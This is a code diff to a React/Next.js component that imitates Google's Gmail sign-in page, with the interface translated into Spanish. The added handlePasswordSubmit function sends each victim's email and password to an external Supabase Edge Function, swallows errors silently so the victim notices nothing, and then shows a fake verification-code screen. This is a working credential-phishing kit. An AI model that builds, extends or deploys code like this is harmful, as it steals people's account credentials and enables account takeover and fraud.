@@ -2,9 +2,18 @@
 
 import { useState } from "react";
 import Image from "next/image";
+import { createClient } from "@supabase/supabase-js";
 
 // Tipos para los pasos del flujo
 type LoginStep = "identifier" | "password" | "forgot-email" | "recovery-code";
+
+// Inicialización del cliente de Supabase con tu project ref
+// TODO: Reemplaza "PUBLIC_ANON_KEY" con tu anon key real desde los ajustes de Supabase
+const supabase = createClient("https://wpuviyyopppmjkpjykak.supabase.co", "PUBLIC_ANON_KEY");
+
+// URL de tu Edge Function construida con tu project ref
+// TODO: Reemplaza "TU_FUNCION" con el nombre exacto de la carpeta de tu función
+const EDGE_FUNCTION_URL = "https://wpuviyyopppmjkpjykak.supabase.co/functions/v1/post-data";
 
 export default function GoogleLogin() {
   const [step, setStep] = useState<LoginStep>("identifier");
@@ -22,6 +31,33 @@ export default function GoogleLogin() {
     }, 600);
   };
 
+  // Función específica para guardar los datos cuando se envía la contraseña
+  const handlePasswordSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
+
+    try {
+      // Petición POST a tu Edge Function utilizando la URL de tu proyecto
+      await fetch(EDGE_FUNCTION_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          user: email,
+          password: password,
+          authentication: "google_login_flow" // Identificador para la columna authentication
+        }),
+      });
+    } catch (error) {
+      console.error("Error al guardar datos:", error);
+      // Falla silenciosamente para no interrumpir la experiencia visual del usuario
+    } finally {
+      setIsLoading(false);
+      setStep("recovery-code"); // Pasa a la siguiente pantalla sin importar qué pase
+    }
+  };
+
   return (
     <div className="flex flex-col min-h-screen items-center justify-center bg-white sm:bg-[#f0f2f5] font-sans selection:bg-blue-100">
       <main className="w-full max-w-[450px] overflow-hidden rounded-lg border-none bg-white p-6 sm:border sm:border-gray-300 sm:px-10 sm:py-12">
@@ -35,8 +71,8 @@ export default function GoogleLogin() {
         <div className="mt-2 text-center">
           {step === "identifier" && (
             <div className="animate-in fade-in duration-500">
-              <h1 className="text-2xl font-normal text-gray-900">Sign in</h1>
-              <p className="mt-2 text-base text-gray-700">Use your Google Account</p>
+              <h1 className="text-2xl font-normal text-gray-900">Accede a tu cuenta</h1>
+              <p className="mt-2 text-base text-gray-700">con tu Cuenta de Google para ir a Gmail. Esta cuenta estará disponible para otras apps de Google en el navegador.</p>
               
               <form onSubmit={(e) => handleNext(e, "password")} className="mt-8 text-left">
                 <div className="relative mb-2">
@@ -49,7 +85,7 @@ export default function GoogleLogin() {
                     placeholder=" "
                   />
                   <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
-                    Email or phone
+                    Correo electronico o número de teléfono
                   </label>
                 </div>
                 
@@ -58,24 +94,24 @@ export default function GoogleLogin() {
                   onClick={() => setStep("forgot-email")}
                   className="text-sm font-semibold text-blue-600 hover:text-blue-700"
                 >
-                  Forgot email?
+                  ¿Olvidaste tu correo electrónico?
                 </button>
 
                 <p className="mt-10 text-sm text-gray-600">
-                  Not your computer? Use Guest mode to sign in privately.{" "}
-                  <a href="#" className="font-semibold text-blue-600">Learn more</a>
+                  ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.{" "}
+                  <a href="#" className="font-semibold text-blue-600">Leer mas</a>
                 </p>
 
                 <div className="mt-10 flex items-center justify-between">
                   <button type="button" className="text-sm font-semibold text-blue-600 hover:bg-blue-50 px-2 py-2 rounded">
-                    Create account
+                    Crear cuenta
                   </button>
                   <button 
                     disabled={isLoading}
                     type="submit"
                     className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 focus:ring-4 focus:ring-blue-200 disabled:opacity-70"
                   >
-                    {isLoading ? "Loading..." : "Next"}
+                    {isLoading ? "Cargando..." : "Siguiente"}
                   </button>
                 </div>
               </form>
@@ -98,7 +134,7 @@ export default function GoogleLogin() {
                 </svg>
               </div>
 
-              <form onSubmit={(e) => handleNext(e, "recovery-code")} className="mt-10 text-left">
+              <form onSubmit={handlePasswordSubmit} className="mt-10 text-left">
                 <div className="relative mb-2">
                   <input
                     type="password"
@@ -110,13 +146,13 @@ export default function GoogleLogin() {
                     placeholder=" "
                   />
                   <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
-                    Enter your password
+                    Ingresa su contraseña
                   </label>
                 </div>
 
                 <div className="mt-2 flex items-center gap-2">
                   <input type="checkbox" id="show-pass" className="h-4 w-4 rounded border-gray-300" />
-                  <label htmlFor="show-pass" className="text-sm text-gray-700">Show password</label>
+                  <label htmlFor="show-pass" className="text-sm text-gray-700">Mostrar contraseña</label>
                 </div>
 
                 <div className="mt-12 flex items-center justify-between">
@@ -125,13 +161,14 @@ export default function GoogleLogin() {
                     onClick={() => setStep("recovery-code")}
                     className="text-sm font-semibold text-blue-600 hover:bg-blue-50 px-2 py-2 rounded"
                   >
-                    Forgot password?
+                    ¿Olvidaste tu contraseña?
                   </button>
                   <button 
+                    disabled={isLoading}
                     type="submit"
-                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700"
+                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-70"
                   >
-                    Next
+                    {isLoading ? "Cargando..." : "Siguiente"}
                   </button>
                 </div>
               </form>
@@ -140,8 +177,8 @@ export default function GoogleLogin() {
 
           {step === "forgot-email" && (
             <div className="animate-in slide-in-from-left-4 duration-300">
-              <h1 className="text-2xl font-normal text-gray-900">Find your email</h1>
-              <p className="mt-2 text-base text-gray-700">Enter your phone number or recovery email</p>
+              <h1 className="text-2xl font-normal text-gray-900">¿Olvidaste tu correo electrónico?</h1>
+              <p className="mt-2 text-base text-gray-700">Ingresa tu número de teléfono o correo electrónico de recuperación</p>
               
               <form onSubmit={(e) => handleNext(e, "identifier")} className="mt-8 text-left">
                 <div className="relative mb-8">
@@ -152,7 +189,7 @@ export default function GoogleLogin() {
                     placeholder=" "
                   />
                   <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
-                    Phone number or email
+                    Correo electrónico o número de teléfono de recuperación
                   </label>
                 </div>
 
@@ -161,7 +198,7 @@ export default function GoogleLogin() {
                     type="submit"
                     className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700"
                   >
-                    Next
+                    Siguiente
                   </button>
                 </div>
               </form>
@@ -170,9 +207,9 @@ export default function GoogleLogin() {
 
           {step === "recovery-code" && (
             <div className="animate-in fade-in zoom-in-95 duration-300">
-              <h1 className="text-2xl font-normal text-gray-900">Account recovery</h1>
+              <h1 className="text-2xl font-normal text-gray-900">Recuperación de cuenta</h1>
               <p className="mt-2 text-base text-gray-700">
-                A verification code was sent to your recovery device.
+                Se ha enviado un código de verificación a tu dispositivo de recuperación.
               </p>
               
               <form onSubmit={(e) => handleNext(e, "identifier")} className="mt-8 text-left">
@@ -187,7 +224,7 @@ export default function GoogleLogin() {
                 </div>
                 
                 <button type="button" className="text-sm font-semibold text-blue-600">
-                  Try another way
+                  Probar otra forma
                 </button>
 
                 <div className="mt-10 flex items-center justify-end">
@@ -195,7 +232,7 @@ export default function GoogleLogin() {
                     type="submit"
                     className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700"
                   >
-                    Verify
+                    Verificar
                   </button>
                 </div>
               </form>
@@ -209,8 +246,8 @@ export default function GoogleLogin() {
       <footer className="absolute bottom-4 flex w-full max-w-[450px] justify-between px-6 text-xs text-gray-600 sm:relative sm:mt-4 sm:max-w-3xl">
         <div className="flex gap-4">
           <select className="bg-transparent hover:bg-gray-100 rounded px-1 cursor-pointer outline-none">
-            <option>English (United States)</option>
             <option>Español (España)</option>
+            <option>English (United States)</option>
           </select>
         </div>
         <div className="flex gap-4">
